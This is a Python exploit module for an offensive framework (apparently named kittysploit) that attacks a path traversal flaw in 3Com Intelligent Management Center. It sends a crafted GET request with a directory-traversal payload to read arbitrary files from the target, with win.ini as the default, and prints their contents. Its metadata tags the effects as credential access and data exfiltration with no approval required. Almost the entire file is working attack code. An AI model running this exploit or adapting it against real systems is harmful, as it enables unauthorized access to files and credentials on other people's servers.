#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""3Com IMC Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': '3Com IMC Path Traversal',
        'description': 'Exploits 3Com Intelligent Management Center path traversal vulnerability. If the target is vulnerable it is possible to read file from the filesystem.',
        'author': ['Richard Brain', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/12679/'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")
    filename = OptString("\\windows\\win.ini", "File to read from the filesystem")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            print_status("Sending paylaod request")

            path = "/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..{}".format(self.filename)
            response = self.http_request(
                method="GET",
                path=path,
            )

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success - reading {} file".format(self.filename))
                print_info(response.text)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        )

        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "[fonts]" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
